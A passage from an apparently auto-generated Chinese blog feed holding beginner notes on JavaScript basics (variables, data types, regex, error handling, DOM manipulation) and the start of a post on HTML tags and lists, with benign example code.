<strong>let定义的变量，只能在块作用域里访问，不能跨块访问，也不能跨函数访问</strong>。 const用来定义常量，使用时必须初始化(即必须赋值)，只能在块作用域里访问，而且不能修改</p></blockquote><p>也就是说var的作用域是全局,而let的作用域是当前</p><h2 id="JS数据类型"><a href="#JS数据类型" class="headerlink" title="JS数据类型"></a>JS数据类型</h2><p>**值类型(基本类型)**：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol。</p><p><strong>引用数据类型（对象类型）</strong>：对象(Object)、数组(Array)、函数(Function)，还有两个特殊的对象：正则（RegExp）和日期（Date）</p><p>可以使用<code>typeof</code>来查看数据类型</p><p>当你需要声明特定数据类型的数据时,可以这样做</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title class_">String</span>;</span><br><span class="line">a = <span class="string">&quot;rabbit like carrot, not cabbage!&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> a);</span><br><span class="line">a = <span class="number">1</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> a);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240122185003344.png" alt="image-20240122185003344"></p><p>但是尝试后发现这似乎并不能阻止自动类型转换</p><p>使用new来创建一个string或其他类型是因为在js中一切皆是对象,在new的过程中只是运行了对应类的constructor构造器来构造一个新的对象实例</p><h3 id="数组示例"><a href="#数组示例" class="headerlink" title="数组示例"></a>数组示例</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> nacl = [<span class="string">&quot;cabbage&quot;</span>, <span class="string">&quot;rabbit&quot;</span>, <span class="string">&quot;carrot&quot;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nacl[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//由于js万物皆为对象的特性,也可以用new来创建一个数组</span></span><br><span class="line"><span class="keyword">let</span> nacl = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;cabbage&quot;</span>, <span class="string">&quot;rabbit&quot;</span>, <span class="string">&quot;carrot&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nacl[<span class="number">0</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>typeof一下也可以看见这的确都是obj</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240122183414765.png"></p><h3 id="对象示例"><a href="#对象示例" class="headerlink" title="对象示例"></a>对象示例</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">    <span class="attr">cabbage</span>: <span class="string">&quot;qqq&quot;</span>,</span><br><span class="line">    <span class="attr">rabbit</span>: <span class="string">&quot;www&quot;</span>,</span><br><span class="line">    <span class="attr">carrot</span>: <span class="string">&quot;eee&quot;</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> person);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">cabbage</span>);     <span class="comment">//访问对象内的属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person[<span class="string">&#x27;cabbage&#x27;</span>]);<span class="comment">//访问对象内的属性</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">    <span class="attr">cabbage</span>: <span class="string">&quot;qqq&quot;</span>,</span><br><span class="line">    <span class="attr">rabbit</span>: <span class="string">&quot;www&quot;</span>,</span><br><span class="line">    <span class="attr">carrot</span>: <span class="string">&quot;eee&quot;</span>,</span><br><span class="line">    <span class="attr">laugh</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hahahahaha!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">person.<span class="title function_">laugh</span>();</span><br><span class="line"><span class="comment">//输出:hahahahaha!</span></span><br></pre></td></tr></table></figure><h2 id="JS函数"><a href="#JS函数" class="headerlink" title="JS函数"></a>JS函数</h2><p>示例:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">calc</span>(<span class="params">c</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">calc</span>(<span class="number">3</span>));</span><br><span class="line"><span class="comment">//输出 6</span></span><br></pre></td></tr></table></figure><h2 id="JS事件"><a href="#JS事件" class="headerlink" title="JS事件"></a>JS事件</h2><table><thead><tr><th align="left">事件</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">onchange</td><td align="left">HTML 元素改变</td></tr><tr><td align="left">onclick</td><td align="left">用户点击 HTML 元素</td></tr><tr><td align="left">onmouseover</td><td align="left">鼠标指针移动到指定的元素上时发生</td></tr><tr><td align="left">onmouseout</td><td align="left">用户从一个 HTML 元素上移开鼠标时发生</td></tr><tr><td align="left">onkeydown</td><td align="left">用户按下键盘按键</td></tr><tr><td align="left">onload</td><td align="left">浏览器已完成页面的加载</td></tr></tbody></table><p>示例:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;script()&quot;</span>&gt;</span></span><br><span class="line">    //res</span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="字符串模板"><a href="#字符串模板" class="headerlink" title="字符串模板"></a>字符串模板</h2><p>使用反引号来创建字符串模板</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240122200124676.png" alt="image-20240122200124676"></p><p>在${}中可以说表达式或变量名</p><h2 id="选择-循环"><a href="#选择-循环" class="headerlink" title="选择,循环"></a>选择,循环</h2><p>这些几乎与C语言一模一样</p><h2 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h2><h3 id="使用字符串方法"><a href="#使用字符串方法" class="headerlink" title="使用字符串方法"></a>使用字符串方法</h3><p>.search</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> pat = <span class="regexp">/cabbage/i</span>;</span><br><span class="line"><span class="keyword">let</span> nacl = <span class="string">&quot;rabbit like carrot, not cabbage!&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nacl.<span class="title function_">search</span>(pat));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nacl.<span class="title function_">search</span>(<span class="string">&quot;cabbage&quot;</span>)); <span class="comment">//注意这里时大小写敏感的</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nacl.<span class="title function_">search</span>(<span class="regexp">/cabbage/i</span>));</span><br><span class="line">这都会输出<span class="number">24</span>,单词cabbage的起始位置</span><br></pre></td></tr></table></figure><p>.replace</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> pat = <span class="regexp">/cabbage/i</span>;</span><br><span class="line"><span class="keyword">let</span> nacl = <span class="string">&quot;rabbit like carrot, not cabbage!&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> ans = nacl.<span class="title function_">replace</span>(pat, <span class="string">&quot;fruit&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ans);</span><br><span class="line"><span class="comment">//输出 rabbit like carrot, not fruit!</span></span><br></pre></td></tr></table></figure><h3 id="使用RegExp方法"><a href="#使用RegExp方法" class="headerlink" title="使用RegExp方法"></a>使用RegExp方法</h3><p>.test()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> pat = <span class="regexp">/cabbage/i</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pat.<span class="title function_">test</span>(<span class="string">&quot;rabbit like carrot, not cabbage!&quot;</span>));</span><br><span class="line"><span class="comment">//返回 true,因为存在cabbage</span></span><br></pre></td></tr></table></figure><p>.exec()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> pat = <span class="regexp">/cabbage/i</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pat.<span class="title function_">exec</span>(<span class="string">&quot;rabbit like carrot, not cabbage!&quot;</span>));</span><br><span class="line"><span class="comment">//返回一个数组</span></span><br><span class="line">[</span><br><span class="line">  <span class="string">&#x27;cabbage&#x27;</span>,</span><br><span class="line">  <span class="attr">index</span>: <span class="number">24</span>,</span><br><span class="line">  <span class="attr">input</span>: <span class="string">&#x27;rabbit like carrot, not cabbage!&#x27;</span>,</span><br><span class="line">  <span class="attr">groups</span>: <span class="literal">undefined</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h2><p>示例:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">tes</span>(<span class="params">c</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;&#x27;</span>) <span class="keyword">throw</span> <span class="string">&quot;值为空&quot;</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;finished!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">tes</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment">/*输出</span></span><br><span class="line"><span class="comment">值为空</span></span><br><span class="line"><span class="comment">finished!</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>无论是否抛出异常,finally都会执行</p><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240122205408260.png" alt="image-20240122205408260"></p><p>通过DOM树可以获取或者改变HTML中某个元素的值</p><p>为了做到这件事情，您必须首先找到该元素。有三种方法来做这件事：</p><ul><li>通过 id 找到 HTML 元素</li><li>通过标签名找到 HTML 元素</li><li>通过类名找到 HTML 元素</li></ul><h3 id="通过-id-找到-HTML-元素"><a href="#通过-id-找到-HTML-元素" class="headerlink" title="通过 id 找到 HTML 元素"></a>通过 id 找到 HTML 元素</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;main&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="通过标签名找到-HTML-元素"><a href="#通过标签名找到-HTML-元素" class="headerlink" title="通过标签名找到 HTML 元素"></a>通过标签名找到 HTML 元素</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> y=x.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;p&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="通过类名找到-HTML-元素"><a href="#通过类名找到-HTML-元素" class="headerlink" title="通过类名找到 HTML 元素"></a>通过类名找到 HTML 元素</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x=<span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;intro&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="通过DOM改变HTML"><a href="#通过DOM改变HTML" class="headerlink" title="通过DOM改变HTML"></a>通过DOM改变HTML</h2><p>示例:</p><p>改变内容:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;p1&quot;</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p1&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;新文本!&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>改变属性:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;image&quot;</span> <span class="attr">src</span>=<span class="string">&quot;smiley.gif&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;image&quot;</span>).<span class="property">src</span>=<span class="string">&quot;landscape.jpg&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>改变css样式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;p1&quot;</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;p2&quot;</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p2&quot;</span>).<span class="property">style</span>.<span class="property">color</span>=<span class="string">&quot;blue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p2&quot;</span>).<span class="property">style</span>.<span class="property">fontFamily</span>=<span class="string">&quot;Arial&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p2&quot;</span>).<span class="property">style</span>.<span class="property">fontSize</span>=<span class="string">&quot;larger&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>某事件触发时改变</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">&quot;this.innerHTML=&#x27;Ooops!&#x27;&quot;</span>&gt;</span>点击文本!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Javascript基础&quot;&gt;&lt;a href=&quot;#Javascript基础&quot; class=&quot;headerlink&quot; title=&quot;Javascript基础&quot;&gt;&lt;/a&gt;Javascript基础&lt;/h1&gt;&lt;h2 id=&quot;添加方式&quot;&gt;&lt;a href=&quot;#添加方式&quot; cla</summary>
      
    
    
    
    <category term="语言基础" scheme="http://example.com/categories/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="Javascript" scheme="http://example.com/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>HTML基础</title>
    <link href="http://example.com/2024/01/21/HTML%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/01/21/HTML%E5%9F%BA%E7%A1%80/</id>
    <published>2024-01-21T04:07:00.000Z</published>
    <updated>2024-01-22T07:47:31.340Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTML基础"><a href="#HTML基础" class="headerlink" title="HTML基础"></a>HTML基础</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>众所周知HTML是一款超文本标记语言而不是编程语言</p><p>摘自菜鸟教程:</p><blockquote><p>超文本标记语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。</p><p>您可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。</p></blockquote><h2 id="一些过去没注意到的点"><a href="#一些过去没注意到的点" class="headerlink" title="一些过去没注意到的点:"></a>一些过去没注意到的点:</h2><p>HTML的文件后缀名有两种:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.html</span><br><span class="line">.htm</span><br></pre></td></tr></table></figure><p>这两种都是表示html文件,完全一样</p><p>html标签是不区分大小写的,所以:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;TiTLE&gt;&lt;/title&gt;</span><br><span class="line">&lt;TITLE&gt;&lt;/TITLE&gt;</span><br></pre></td></tr></table></figure><p>这些都是等价的</p><p>但通常都写作小写字母</p><p>(这些特性或许有一定的利用价值)</p><h2 id="为什么需要html"><a href="#为什么需要html" class="headerlink" title="为什么需要html?"></a>为什么需要html?</h2><p>以本人浅薄的认知,html的存在正如其名用于标记文本,将不同的文本内容标记上特定标签(tag),用于对每一类型的文本实现不同的显示效果或者对他们进行不同的操作.</p><p>当然这只是便于我个人理解,最终的解释还是得看官方文档</p><p>MDN上的教程: <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML">HTML（超文本标记语言）</a></p><h2 id="标签-元素-属性"><a href="#标签-元素-属性" class="headerlink" title="标签,元素,属性"></a>标签,元素,属性</h2><p>在HTML中,标签 元素 属性通常是关联出现的,一对标签内包含着对应的元素,不同的元素可以有不同的属性</p><p>例如:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">http://www.n4c1.top</span>&gt;</span>这是我的博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中<code>&lt;p&gt;&lt;/p&gt;</code> <code>&lt;a&gt;&lt;/a&gt;</code>为标签,其中包裹的文字内容为元素,而<code>href</code>则为属性,其指定了一个链接</p><p>当然,单独的这些标签并不能起到我们想要的作用,还需要加上一些特定的html说明</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">http://www.n4c1.top</span>&gt;</span>这是我的博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样就构成了完整的一个html文件,开启apache或其他网络服务,我们就可以访问到这个网页的内容</p><p>将它的文件名改为<code>index.html</code>作为网站的起始</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240121125705980.png" alt="image-20240121125705980"></p><h2 id="接下来是一些常用的标签"><a href="#接下来是一些常用的标签" class="headerlink" title="接下来是一些常用的标签"></a>接下来是一些常用的标签</h2><blockquote><p><code>&lt;h1&gt;&lt;/h1&gt;</code>~&#96;<h6></h6>&#96; :分别对应1到6级标题</p><p><code>&lt;p&gt;&lt;/p&gt;</code> : 文字段落标签</p><p><code>&lt;a href=xxxx &gt;&lt;/a&gt;</code> : 超链接标签</p><p><code>&lt;blockquote&gt;&lt;/blockquote&gt;</code> : 引言</p><p><code>&lt;hr&gt;</code>: 水平分割线</p><p><code>&lt;br&gt;</code>: 空白行 </p></blockquote><h3 id="HTML段落"><a href="#HTML段落" class="headerlink" title="HTML段落"></a>HTML段落</h3><p>示例:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">abbr</span> <span class="attr">title</span>=<span class="string">&quot;Tianjin University of Technology&quot;</span>&gt;</span>TUT<span class="tag">&lt;/<span class="name">abbr</span>&gt;</span>是一所不错的理工大学<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果:</p><p><abbr title="Tianjin University of Technology">TUT</abbr>是一所不错的理工大学</p><p><code>&lt;abbr&gt;</code>标签可以在鼠标放在被包裹的文字上时显示额外的文字</p><h3 id="HTML-列表"><a href="#HTML-列表" class="headerlink" title="HTML 列表"></a>HTML 列表</h3><table><thead><tr><th align="left">标签</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>&lt;ol&gt;</code></td><td align="left">定义有序列表</td></tr><tr><td align="left"><code>&lt;ul&gt;</code></td><td align="left">定义无序列表</td></tr><tr><td align="left"><code>&lt;li&gt;</code></td><td align="left">定义列表项</td></tr><tr><td align="left"><code>&lt;dl&gt;</code></td><td align="left">定义列表</td></tr><tr><td align="left"><code>&lt;dt&gt;</code></td><td align="left">自定义列表项目</td></tr><tr><td align="left"><code>&lt;dd&gt;</code></td><td align="left">定义自定列表项的描述</td></tr></tbody></table><h5 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表:"></a>无序列表:</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>豆浆<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>油条<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>豆汁<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>焦圈<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果:</p><ul>    <li>豆浆</li>    <li>油条</li>    <li>豆汁</li>    <li>焦圈</li></ul><h5 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表:"></a>有序列表:</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>沿这条路走到头<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>右转<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>直行穿过第一个十字路口<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>在第三个十字路口处左转<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>继续走 300 米，学校就在你的右手边<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果:</p><ol>  <li>沿这条路走到头</li>  <li>右转</li>  <li>直行穿过第一个十字路口</li>  <li>在第三个十字路口处左转</li>  <li>继续走 300 米，学校就在你的右手边</li></ol><p>aaa</p><h3 id="HTML表格table"><a href="#HTML表格table" 